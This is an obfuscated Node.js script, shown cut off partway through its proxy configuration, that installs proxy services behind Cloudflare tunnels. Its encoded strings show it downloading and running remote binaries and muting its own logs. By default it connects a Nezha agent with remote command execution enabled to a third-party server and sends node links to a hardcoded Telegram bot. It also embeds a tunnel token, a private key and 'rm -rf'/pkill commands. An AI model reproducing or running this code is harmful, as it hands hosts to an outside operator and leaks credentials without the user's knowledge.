#!/usr/bin/env node

function _0x39c9(_0x4853e0, _0x57e767) {
  const _0x205c2f = _0x205c()
  return (
    (_0x39c9 = function (_0x39c9c6, _0x250bbb) {
      _0x39c9c6 = _0x39c9c6 - 0x112
      let _0x5116b6 = _0x205c2f[_0x39c9c6]
      return _0x5116b6
    }),
    _0x39c9(_0x4853e0, _0x57e767)
  )
}
const _0x26a414 = _0x39c9
;(function (_0x126dfe, _0x234cda) {
  const _0x4ec3d2 = { _0x31f4c7: 0x18b, _0x436b30: 0x1fa, _0x1fb83f: 0x208, _0x1ce111: 0x1cb, _0x3e6ce1: 0x1a7 },
    _0x3d335d = _0x39c9,
    _0x45b1c0 = _0x126dfe()
  while (!![]) {
    try {
      const _0x244ed9 =
        -parseInt(_0x3d335d(0x1da)) / 0x1 +
        parseInt(_0x3d335d(0x20e)) / 0x2 +
        (-parseInt(_0x3d335d(_0x4ec3d2._0x31f4c7)) / 0x3) * (parseInt(_0x3d335d(_0x4ec3d2._0x436b30)) / 0x4) +
        (parseInt(_0x3d335d(_0x4ec3d2._0x1fb83f)) / 0x5) * (parseInt(_0x3d335d(0x1ca)) / 0x6) +
        (parseInt(_0x3d335d(0x212)) / 0x7) * (-parseInt(_0x3d335d(0x205)) / 0x8) +
        (parseInt(_0x3d335d(_0x4ec3d2._0x1ce111)) / 0x9) * (parseInt(_0x3d335d(_0x4ec3d2._0x3e6ce1)) / 0xa) +
        (-parseInt(_0x3d335d(0x152)) / 0xb) * (-parseInt(_0x3d335d(0x13c)) / 0xc)
      if (_0x244ed9 === _0x234cda) break
      else _0x45b1c0['push'](_0x45b1c0['shift']())
    } catch (_0x183592) {
      _0x45b1c0['push'](_0x45b1c0['shift']())
    }
  }
})(_0x205c, 0xd447f)
const http = require('http'),
  axios = require(_0x26a414(0x19a)),
  os = require('os'),
  fs = require('fs'),
  path = require(_0x26a414(0x12d)),
  crypto = require('crypto'),
  { promisify } = require('util'),
  { exec: execCommand, execSync } = require('child_process'),
  exec = promisify(execCommand),
  PORT = process[_0x26a414(0x1f1)][_0x26a414(0x1f8)] || 0xbb8,
  SUB_PATH = process[_0x26a414(0x1f1)]['SUB_PATH'] || _0x26a414(0x217),
  NAME = process[_0x26a414(0x1f1)][_0x26a414(0x235)] || 'js-node',
  CFIP = process[_0x26a414(0x1f1)]['CFIP'] || _0x26a414(0x17c),
  CFPORT = process['env'][_0x26a414(0x22c)] || 0x1bb,
  UPLOAD_URL = process[_0x26a414(0x1f1)]['UPLOAD_URL'] || '',
  PROJECT_URL = process[_0x26a414(0x1f1)][_0x26a414(0x1e1)] || '',
  AUTO_ACCESS = process[_0x26a414(0x1f1)][_0x26a414(0x233)] || ![],
  FILE_PATH = process[_0x26a414(0x1f1)][_0x26a414(0x19b)] || _0x26a414(0x194),
  NEZHA_SERVER = process[_0x26a414(0x1f1)][_0x26a414(0x139)] || _0x26a414(0x1ec),
  NEZHA_PORT = process[_0x26a414(0x1f1)][_0x26a414(0x16b)] || '',
  NEZHA_KEY = process[_0x26a414(0x1f1)][_0x26a414(0x21f)] || _0x26a414(0x225),
  UUID = process[_0x26a414(0x1f1)][_0x26a414(0x1ac)] || _0x26a414(0x16e),
  ARGO_AUTH = process[_0x26a414(0x1f1)]['ARGO_AUTH'] || _0x26a414(0x157),
  ARGO_DOMAIN = process['env'][_0x26a414(0x19e)] || 'northflank.933993.xyz',
  ARGO_PORT = process['env'][_0x26a414(0x21a)] || 0xe2e1,
  S5_PORT = process['env']['S5_PORT'] || '',
  HY2_PORT = process[_0x26a414(0x1f1)][_0x26a414(0x158)] || '',
  REALITY_PORT = process[_0x26a414(0x1f1)][_0x26a414(0x16c)] || '',
  CHAT_ID = process[_0x26a414(0x1f1)][_0x26a414(0x1fc)] || '7575949494',
  BOT_TOKEN = process[_0x26a414(0x1f1)][_0x26a414(0x11a)] || _0x26a414(0x1bf),
  SHOW_LOG = ![_0x26a414(0x173), _0x26a414(0x115), 'no'][_0x26a414(0x1d0)](
    (process[_0x26a414(0x1f1)]['SHOW_LOG'] || _0x26a414(0x173))[_0x26a414(0x1ed)]()
  )
!SHOW_LOG && ((console['log'] = () => {}), (console[_0x26a414(0x1bc)] = () => {}))
function alwaysLog(_0x45a47c) {
  const _0x5270f3 = { _0x157a6f: 0x14d, _0x40dfd9: 0x186 },
    _0x5e0675 = _0x26a414
  process[_0x5e0675(_0x5270f3._0x157a6f)][_0x5e0675(_0x5270f3._0x40dfd9)](_0x45a47c + '\x0a')
}
if (!fs[_0x26a414(0x1a0)](FILE_PATH)) fs[_0x26a414(0x1c8)](FILE_PATH)
else {
}
function isValidPort(_0x1a5d7d) {
  const _0x2c4a06 = { _0x40e6eb: 0x143 },
    _0x2a0cbd = _0x26a414
  try {
    if (_0x1a5d7d === null || _0x1a5d7d === undefined || _0x1a5d7d === '') return ![]
    if (typeof _0x1a5d7d === 'string' && _0x1a5d7d[_0x2a0cbd(_0x2c4a06._0x40e6eb)]() === '') return ![]
    const _0x14e0e5 = parseInt(_0x1a5d7d)
    if (isNaN(_0x14e0e5)) return ![]
    if (_0x14e0e5 < 0x1 || _0x14e0e5 > 0xffff) return ![]
    return !![]
  } catch (_0x12ed03) {
    return ![]
  }
}
function generateRandomName() {
  const _0x1890b8 = { _0x5a9178: 0x190 },
    _0x582746 = _0x26a414,
    _0x1404f2 = _0x582746(_0x1890b8._0x5a9178)
  let _0x9d41a0 = ''
  for (let _0x2542b5 = 0x0; _0x2542b5 < 0x6; _0x2542b5++) {
    _0x9d41a0 += _0x1404f2[_0x582746(0x219)](Math['floor'](Math[_0x582746(0x1f5)]() * _0x1404f2[_0x582746(0x169)]))
  }
  return _0x9d41a0
}
let subContent = null,
  privateKey = '',
  publicKey = ''
const npmName = generateRandomName(),
  webName = generateRandomName(),
  botName = generateRandomName(),
  phpName = generateRandomName()
let npmPath = path[_0x26a414(0x237)](FILE_PATH, npmName),
  phpPath = path['join'](FILE_PATH, phpName),
  webPath = path[_0x26a414(0x237)](FILE_PATH, webName),
  botPath = path[_0x26a414(0x237)](FILE_PATH, botName),
  subPath = path[_0x26a414(0x237)](FILE_PATH, 'sub.txt'),
  listPath = path[_0x26a414(0x237)](FILE_PATH, _0x26a414(0x1ae)),
  bootLogPath = path['join'](FILE_PATH, _0x26a414(0x1d6)),
  configPath = path[_0x26a414(0x237)](FILE_PATH, _0x26a414(0x17d)),
  certPath = path[_0x26a414(0x1ba)](FILE_PATH, _0x26a414(0x1db)),
  keyPath = path[_0x26a414(0x1ba)](FILE_PATH, _0x26a414(0x23b))
function deleteNodes() {
  const _0x34cc33 = { _0x3a5acd: 0x14a, _0x56f675: 0x1a8, _0x4805c3: 0x1f3 },
    _0x556b29 = _0x26a414
  try {
    if (!UPLOAD_URL) return
    if (!fs[_0x556b29(0x1a0)](subPath)) return
    let _0x3759c5
    try {
      _0x3759c5 = fs[_0x556b29(0x15f)](subPath, _0x556b29(_0x34cc33._0x3a5acd))
    } catch {
      return null
    }
    const _0x1f747d = Buffer[_0x556b29(0x17b)](_0x3759c5, 'base64')['toString'](_0x556b29(0x14a)),
      _0x3fb8ae = _0x1f747d['split']('\x0a')[_0x556b29(_0x34cc33._0x56f675)]((_0x22ba2d) =>
        /(vless|vmess|trojan|hysteria2|socks):\/\//['test'](_0x22ba2d)
      )
    if (_0x3fb8ae[_0x556b29(0x169)] === 0x0) return
    return (
      axios['post'](UPLOAD_URL + _0x556b29(_0x34cc33._0x4805c3), JSON[_0x556b29(0x193)]({ nodes: _0x3fb8ae }), {
        headers: { 'Content-Type': _0x556b29(0x185) }
      })[_0x556b29(0x230)]((_0x59f07f) => {
        return null
      }),
      null
    )
  } catch (_0x55b02e) {
    return null
  }
}
function cleanupOldFiles() {
  const _0x4debb0 = { _0x2e1eb1: 0x206, _0x49084f: 0x11d },
    _0x4baf13 = _0x26a414
  try {
    const _0x1773c6 = fs['readdirSync'](FILE_PATH)
    _0x1773c6[_0x4baf13(0x162)]((_0x3ca227) => {
      const _0x11d3d9 = _0x4baf13,
        _0x511aa1 = path[_0x11d3d9(0x237)](FILE_PATH, _0x3ca227)
      try {
        const _0x4b7ca4 = fs[_0x11d3d9(_0x4debb0._0x2e1eb1)](_0x511aa1)
        _0x4b7ca4[_0x11d3d9(0x1c1)]() && fs[_0x11d3d9(_0x4debb0._0x49084f)](_0x511aa1)
      } catch (_0x253e33) {}
    })
  } catch (_0x434abe) {}
}
function _0x205c() {
  const _0xfbba8b = [
    'mkdirSync',
    'https://bing.com',
    '18636fkEzsl',
    '9FAvmLT',
    'freedom',
    '\x0asocks://',
    '\x20successfully',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    'includes',
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a',
    '\x20>/dev/null\x202>&1',
    '\x22\x20-out\x20\x22',
    'has',
    'vless-in',
    'boot.log',
    '443',
    'update',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    '1108701VaYxvT',
    'cert.pem',
    'socks',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    'message',
    'vless-fallback-in',
    'trojan',
    'PROJECT_URL',
    '\x20in\x20clouudflare',
    'Private\x20Key:',
    '\x20-p\x20',
    'key.txt',
    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\x0a',
    'log',
    'now',
    'slice',
    'arm64',
    '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20',
    'nezha.933993.xyz:443',
    'toLowerCase',
    'del\x20/f\x20/q\x20',
    '&fp=firefox&type=ws&host=',
    'digest',
    'env',
    'substring',
    '/api/delete-nodes',
    'subarray',
    'random',
    'utf8',
    'sha256',
    'PORT',
    'true',
    '1569588NjdZFG',
    '2087',
    'CHAT_ID',
    'pkill\x20-f\x20\x22[',
    '127.0.0.1',
    '\x20is\x20running',
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
    'quic',
    'web\x20running\x20error:\x20',
    '.download',
    'php\x20running\x20error:\x20',
    '8BNXROe',
    'statSync',
    '2053',
    '630AHRoXi',
    'match',
    'proxy',
    'nohup\x20\x22',
    'xtls-rprx-vision',
    'https://arm64.ssss.nyc.mn',
    '942926wguAcG',
    '\x20from\x20backup\x20source',
    'vless',
    '\x0aclient_secret:\x20',
    '6764317FHRfzx',
    '/vmess-argo',
    'replace',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
    '800',
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'charAt',
    'ARGO_PORT',
    'org',
    'auto',
    'renameSync',
    '\x20>/dev/null\x202>&1\x20&',
    'NEZHA_KEY',
    'fileUrls',
    'Error\x20in\x20startserver:',
    '\x20-c\x20\x22',
    'blackhole',
    'base64',
    '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
    'http://ipv6.ip.sb',
    'Failed\x20to\x20get\x20IP\x20address:',
    'generateKeyPairSync',
    'password',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'export',
    'CFPORT',
    'curl\x20-sm\x203\x20ipv6.ip.sb',
    'createServer',
    'push',
    'catch',
    'createWriteStream',
    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
    'AUTO_ACCESS',
    'url',
    'NAME',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    'join',
    'https+local://8.8.8.8/dns-query',
    'der',
    'toString',
    'private.key',
    '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',
    'Failed\x20to\x20calculate\x20certificate\x20fingerprint:',
    'inbounds',
    'nohup\x20',
    'Error\x20executing\x20command:\x20',
    'createHash',
    'disable',
    'then',
    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
    '/dev/null',
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
    'BOT_TOKEN',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20',
    'arm',
    'unlinkSync',
    'vless-tcp-in',
    'none',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    'Error\x20downloading\x20files:',
    '/v1',
    '/api/add-subscriptions',
    'Retrying\x20',
    '\x20-c\x20',
    'countryCode',
    '/bot',
    'success',
    '2083',
    'tls',
    'Not\x20Found',
    '8443',
    'path',
    'vmess-ws-in',
    'spki',
    '\x20failed:\x20',
    'taskkill\x20/f\x20/im\x20',
    '?security=tls&sni=',
    '/trojan-argo',
    'www.iij.ad.jp:443',
    '/sub.txt\x20saved\x20successfully',
    'unshift',
    'App\x20is\x20running',
    '\x20-s\x20',
    'NEZHA_SERVER',
    '-----BEGIN\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'country_code',
    '12cRTTBw',
    'direct',
    '\x0a\x0atrojan://',
    'Error\x20reading\x20boot.log:',
    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\x0a',
    'toUpperCase',
    'privateKey',
    'trim',
    'https://amd64.oooen.com',
    'listen',
    'tunnel.yml',
    '/api/add-nodes',
    'https://oooo.serv00.net/add-url',
    'Download\x20',
    'utf-8',
    'https://arm64.oooen.com',
    'post',
    'stdout',
    'ARGO_DOMAIN:',
    'promises',
    'openssl\x20version',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    '33555049mjlDhX',
    '/vmess-argo?ed=2560',
    'https://amd64.ssss.nyc.mn',
    'hex',
    'Subscription\x20uploaded\x20successfully',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiNzgyYThhMjQtYzU0YS00ZGMyLThmMTUtMGE2YTFkYzc2NzZjIiwicyI6Ik56UTJNREJtWVdJdFlXWXpNQzAwTldFMkxXSTNOMk10TUdZNU0yWXpOVEUxWW1NeiJ9',
    'HY2_PORT',
    'fileName',
    'chmodSync',
    '2096',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    'http',
    '/vless-argo',
    'readFileSync',
    'amd',
    'text/html;\x20charset=utf-8',
    'forEach',
    '节点推送**\x0a```',
    'Skipping\x20adding\x20automatic\x20access\x20task',
    'Add\x20automatic\x20access\x20task\x20faild:\x20',
    'get',
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
    'length',
    '&pinSHA256=',
    'NEZHA_PORT',
    'REALITY_PORT',
    'tunnel.json',
    '4d70c2f2-caa4-4d12-be8f-e2530036a5a0',
    'Public\x20Key:',
    '/config.yaml\x22\x20>/dev/null\x202>&1\x20&',
    'close',
    'aarch64',
    'false',
    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\x0a',
    'PrivateKey:\x20',
    '\x0a\x20\x20tunnel:\x20',
    'platform',
    'vless-ws-in',
    'Empowerment\x20failed\x20for\x20',
    'npm\x20running\x20error:\x20',
    'from',
    'mfa.gov.ua',
    'config.json',
    'base64url',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    'Subscription\x20content\x20not\x20yet\x20available,\x20please\x20try\x20again\x20later.',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    'writeFileSync',
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a',
    'application/json',
    'write',
    'TunnelSecret',
    'all',
    'http://ipv4.ip.sb',
    'status',
    '9PETbNv',
    'Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!',
    'dirname',
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a',
    'test',
    'abcdefghijklmnopqrstuvwxyz',
    '/agent',
    '-----END\x20CERTIFICATE-----\x0a',
    'stringify',
    '.npm',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    '\x22\x20run',
    'ignore',
    'Mozilla/5.0',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels',
    'axios',
    'FILE_PATH',
    'readFile',
    'clear',
    'ARGO_DOMAIN',
    'Unhandled\x20error\x20in\x20startserver:',
    'existsSync',
    'data',
    'basename',
    '\x0ahysteria2://',
    'https://api.telegram.org/bot',
    'Unknown',
    's5-in',
    '2084480NaPdhp',
    'filter',
    'writeHead',
    'reality',
    'text/plain;\x20charset=utf-8',
    'UUID',
    'win32',
    'list.txt',
    'trojan-ws-in',
    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
    '?encryption=none&security=tls&sni=',
    'hysteria-in',
    'pipe',
    '\x0avless://',
    'unlink',
    'http://ip-api.com/json',
    'publicKey',
    'end',
    'split',
    'resolve',
    'stream',
    'error',
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a',
    '&path=%2Fvless-argo%3Fed%3D2560#',
    '7591685848:AAF1sdGl3DXLdy3llHez0_sDEUC8xBw6D50',
    'rm\x20-rf\x20',
    'isFile',
    'response',
    'index.html',
    '/web',
    'ArgoDomain:',
    '/sendMessage',
    'tcp'
  ]
  _0x205c = function () {
    return _0xfbba8b
  }
  return _0x205c()
}
function generateX25519Keypair() {
  const _0x36e0ca = { _0x5eacda: 0x22b, _0x8fa149: 0x1f4, _0xef8a14: 0x23a, _0x113611: 0x23a },
    _0x2e4aab = _0x26a414,
    { publicKey: _0x353d4d, privateKey: _0x7bddb7 } = crypto[_0x2e4aab(0x228)]('x25519'),
    _0x3bb649 = _0x7bddb7[_0x2e4aab(_0x36e0ca._0x5eacda)]({ type: 'pkcs8', format: _0x2e4aab(0x239) })[_0x2e4aab(_0x36e0ca._0x8fa149)](-0x20),
    _0x2569c7 = _0x353d4d[_0x2e4aab(0x22b)]({ type: _0x2e4aab(0x12f), format: _0x2e4aab(0x239) })[_0x2e4aab(0x1f4)](-0x20)
  return {
    privateKey: _0x3bb649[_0x2e4aab(_0x36e0ca._0xef8a14)](_0x2e4aab(0x17e)),
    publicKey: _0x2569c7[_0x2e4aab(_0x36e0ca._0x113611)](_0x2e4aab(0x17e))
  }
}
function generateOrLoadKeyPair() {
  const _0x3cd9a7 = { _0x28dfb7: 0x1f6, _0x330345: 0x209, _0x4a5256: 0x1e7, _0x29e999: 0x16f, _0xf547a3: 0x1b7, _0xb64faf: 0x183, _0x125727: 0x175 },
    _0x339608 = _0x26a414,
    _0x19fc27 = path[_0x339608(0x237)](FILE_PATH, _0x339608(0x1e5))
  if (fs['existsSync'](_0x19fc27)) {
    const _0x5e70e4 = fs[_0x339608(0x15f)](_0x19fc27, _0x339608(_0x3cd9a7._0x28dfb7)),
      _0x4e7a06 = _0x5e70e4[_0x339608(0x209)](/PrivateKey:\s*(.*)/),
      _0x39c6a1 = _0x5e70e4[_0x339608(_0x3cd9a7._0x330345)](/PublicKey:\s*(.*)/)
    if (_0x4e7a06 && _0x39c6a1) {
      ;((privateKey = _0x4e7a06[0x1]['trim']()),
        (publicKey = _0x39c6a1[0x1][_0x339608(0x143)]()),
        console[_0x339608(0x1e7)](_0x339608(0x1e3), privateKey),
        console[_0x339608(_0x3cd9a7._0x4a5256)](_0x339608(_0x3cd9a7._0x29e999), publicKey))
      return
    }
  }
  const _0x141dcf = generateX25519Keypair()
  ;((privateKey = _0x141dcf[_0x339608(0x142)]),
    (publicKey = _0x141dcf[_0x339608(_0x3cd9a7._0xf547a3)]),
    fs[_0x339608(_0x3cd9a7._0xb64faf)](
      _0x19fc27,
      _0x339608(_0x3cd9a7._0x125727) + privateKey + '\x0aPublicKey:\x20' + publicKey + '\x0a',
      _0x339608(0x1f6)
    ),
    console[_0x339608(0x1e7)](_0x339608(0x1e3), privateKey),
    console['log'](_0x339608(_0x3cd9a7._0x29e999), publicKey))
}
const FALLBACK_EC_KEY =
    _0x26a414(0x1d1) +
    'BggqhkjOPQMBBw==\x0a' +
    _0x26a414(0x120) +
    _0x26a414(0x13a) +
    _0x26a414(0x18e) +
    _0x26a414(0x216) +
    _0x26a414(0x200) +
    _0x26a414(0x218),
  FALLBACK_CERT =
    _0x26a414(0x1d9) +
    _0x26a414(0x140) +
    _0x26a414(0x167) +
    _0x26a414(0x1bd) +
    _0x26a414(0x174) +
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a' +
    _0x26a414(0x119) +
    _0x26a414(0x184) +
    _0x26a414(0x1e6) +
    _0x26a414(0x192)
function ensureTlsCertificates(_0x34da1c, _0x10a93c) {
  const _0x588fdf = { _0x5d5bed: 0x1a0, _0x32ee8e: 0x150, _0x531d27: 0x197, _0x2b76e4: 0x1d3, _0x53f300: 0x183 },
    _0x3b16df = _0x26a414
  if (fs[_0x3b16df(_0x588fdf._0x5d5bed)](_0x34da1c) && fs[_0x3b16df(0x1a0)](_0x10a93c)) return
  fs[_0x3b16df(0x1c8)](path[_0x3b16df(0x18d)](_0x34da1c), { recursive: !![] })
  try {
    ;(execSync(_0x3b16df(_0x588fdf._0x32ee8e), { stdio: _0x3b16df(0x197) }),
      execSync(_0x3b16df(0x17f) + _0x10a93c + '\x22', { stdio: _0x3b16df(_0x588fdf._0x531d27) }),
      execSync(_0x3b16df(0x236) + _0x10a93c + _0x3b16df(_0x588fdf._0x2b76e4) + _0x34da1c + _0x3b16df(0x117), { stdio: _0x3b16df(0x197) }))
    return
  } catch (_0x53d186) {}
  ;(fs[_0x3b16df(_0x588fdf._0x53f300)](_0x10a93c, FALLBACK_EC_KEY), fs[_0x3b16df(_0x588fdf._0x53f300)](_0x34da1c, FALLBACK_CERT))
}
function getCertificateFingerprint(_0x50c4f4) {
  const _0x1ca2b5 = { _0x202579: 0x1f6, _0x457d78: 0x224, _0x321cff: 0x114, _0x2c83cf: 0x155, _0x5dccf0: 0x237, _0x2fdad6: 0x1bc, _0x56321c: 0x23d },
    _0x560cdf = _0x26a414
  try {
    const _0x274aaf = execSync('openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22' + _0x50c4f4 + '\x22', {
        encoding: _0x560cdf(_0x1ca2b5._0x202579),
        timeout: 0xbb8
      })[_0x560cdf(0x143)](),
      _0x31845f = _0x274aaf[_0x560cdf(0x209)](/=(.+)$/)
    if (_0x31845f && _0x31845f[0x1]) return _0x31845f[0x1][_0x560cdf(0x141)]()
  } catch (_0x206634) {}
  try {
    const _0x27efbe = fs[_0x560cdf(0x15f)](_0x50c4f4, _0x560cdf(0x1f6)),
      _0x3b7ac5 = _0x27efbe[_0x560cdf(0x209)](/-----BEGIN CERTIFICATE-----([\s\S]+?)-----END CERTIFICATE-----/)
    if (!_0x3b7ac5) return ''
    const _0x5664d5 = _0x3b7ac5[0x1][_0x560cdf(0x214)](/\s/g, ''),
      _0x2ff3ac = Buffer[_0x560cdf(0x17b)](_0x5664d5, _0x560cdf(_0x1ca2b5._0x457d78)),
      _0xa4f6ad = crypto[_0x560cdf(_0x1ca2b5._0x321cff)](_0x560cdf(0x1f7))
        [_0x560cdf(0x1d8)](_0x2ff3ac)
        [_0x560cdf(0x1f0)](_0x560cdf(_0x1ca2b5._0x2c83cf))
    return _0xa4f6ad['match'](/.{2}/g)[_0x560cdf(_0x1ca2b5._0x5dccf0)](':')[_0x560cdf(0x141)]()
  } catch (_0x3a30f5) {
    return (console[_0x560cdf(_0x1ca2b5._0x2fdad6)](_0x560cdf(_0x1ca2b5._0x56321c), _0x3a30f5), '')
  }
}
async function generateConfig() {
  const _0x332c3f = {
      _0x5c4ef4: 0x118,
      _0x18516d: 0x118,
      _0xfaa2: 0x1df,
      _0x2956d5: 0x20c,
      _0xfe5fea: 0x11f,
      _0x3d405f: 0x15e,
      _0x468064: 0x213,
      _0x112752: 0x210,
      _0x4e32b5: 0x1c7,
      _0x2ae6bf: 0x11f,
      _0x4717ac: 0x178,
      _0x3e7c7b: 0x1fe,
      _0x32ed64: 0x210,
      _0x6f4c2f: 0x15e,
      _0x4fa64d: 0x15d,
      _0xd33dcb: 0x1af,
      _0x3f60e9: 0x1e0,
      _0x312a80: 0x238,
      _0x328c9b: 0x1cc,
      _0x4256f4: 0x223,
      _0x1310be: 0x22f,
      _0x135c7e: 0x1d5,
      _0x4ee4e8: 0x134,
      _0x141d84: 0x23e,
      _0x2641b7: 0x1c9,
      _0x355d14: 0x1a6,
      _0x452361: 0x1dc,
      _0x2e48eb: 0x1f2
    },
    _0x4e407e = _0x26a414,
    _0x485ebf = {
      log: { access: _0x4e407e(_0x332c3f._0x5c4ef4), error: _0x4e407e(_0x332c3f._0x18516d), loglevel: _0x4e407e(0x11f) },
      inbounds: [
        {
          tag: _0x4e407e(_0x332c3f._0xfaa2),
          port: ARGO_PORT,
          listen: '::',
          protocol: _0x4e407e(0x210),
          settings: {
            clients: [{ id: UUID, flow: _0x4e407e(_0x332c3f._0x2956d5) }],
            decryption: _0x4e407e(_0x332c3f._0xfe5fea),
            fallbacks: [
              { dest: 0xbb9 },
              { path: _0x4e407e(_0x332c3f._0x3d405f), dest: 0xbba },
              { path: _0x4e407e(_0x332c3f._0x468064), dest: 0xbbb },
              { path: _0x4e407e(0x133), dest: 0xbbc }
            ]
          },
          streamSettings: { network: _0x4e407e(0x1c7) }
        },
        {
          tag: _0x4e407e(0x11e),
          port: 0xbb9,
          listen: _0x4e407e(0x1fe),
          protocol: _0x4e407e(_0x332c3f._0x112752),
          settings: { clients: [{ id: UUID }], decryption: _0x4e407e(0x11f) },
          streamSettings: { network: _0x4e407e(_0x332c3f._0x4e32b5), security: _0x4e407e(_0x332c3f._0x2ae6bf) }
        },
        {
          tag: _0x4e407e(_0x332c3f._0x4717ac),
          port: 0xbba,
          listen: _0x4e407e(_0x332c3f._0x3e7c7b),
          protocol: _0x4e407e(_0x332c3f._0x32ed64),
          settings: { clients: [{ id: UUID, level: 0x0 }], decryption: _0x4e407e(0x11f) },
          streamSettings: { network: 'ws', security: 'none', wsSettings: { path: _0x4e407e(_0x332c3f._0x6f4c2f) } },
          sniffing: { enabled: !![], destOverride: [_0x4e407e(_0x332c3f._0x4fa64d), _0x4e407e(0x12a), _0x4e407e(0x201)], metadataOnly: ![] }
        },
        {
          tag: _0x4e407e(0x12e),
          port: 0xbbb,
          listen: '127.0.0.1',
          protocol: 'vmess',
          settings: { clients: [{ id: UUID, alterId: 0x0 }] },
          streamSettings: { network: 'ws', wsSettings: { path: _0x4e407e(_0x332c3f._0x468064) } },
          sniffing: { enabled: !![], destOverride: [_0x4e407e(0x15d), 'tls', _0x4e407e(0x201)], metadataOnly: ![] }
        },
        {
          tag: _0x4e407e(_0x332c3f._0xd33dcb),
          port: 0xbbc,
          listen: _0x4e407e(0x1fe),
          protocol: _0x4e407e(_0x332c3f._0x3f60e9),
          settings: { clients: [{ password: UUID }] },
          streamSettings: { network: 'ws', security: 'none', wsSettings: { path: _0x4e407e(0x133) } },
          sniffing: { enabled: !![], destOverride: [_0x4e407e(0x15d), 'tls', 'quic'], metadataOnly: ![] }
        }
      ],
      dns: { servers: [_0x4e407e(_0x332c3f._0x312a80)] },
      outbounds: [
        { protocol: _0x4e407e(_0x332c3f._0x328c9b), tag: _0x4e407e(0x13d) },
        { protocol: _0x4e407e(_0x332c3f._0x4256f4), tag: 'block' }
      ]
    }
  ;(isValidPort(REALITY_PORT) &&
    _0x485ebf[_0x4e407e(0x23e)][_0x4e407e(_0x332c3f._0x1310be)]({
      tag: _0x4e407e(_0x332c3f._0x135c7e),
      listen: '::',
      port: parseInt(REALITY_PORT),
      protocol: _0x4e407e(_0x332c3f._0x112752),
      settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: _0x4e407e(_0x332c3f._0xfe5fea) },
      streamSettings: {
        network: 'raw',
        security: _0x4e407e(0x1aa),
        realitySettings: {
          show: ![],
          dest: _0x4e407e(_0x332c3f._0x4ee4e8),
          xver: 0x0,
          serverNames: ['www.iij.ad.jp'],
          privateKey: privateKey,
          shortIds: ['']
        }
      }
    }),
    isValidPort(HY2_PORT) &&
      _0x485ebf[_0x4e407e(_0x332c3f._0x141d84)][_0x4e407e(_0x332c3f._0x1310be)]({
        tag: _0x4e407e(0x1b2),
        listen: '::',
        port: parseInt(HY2_PORT),
        protocol: 'hysteria',
        settings: { version: 0x2, clients: [{ auth: UUID }] },
        streamSettings: {
          network: 'hysteria',
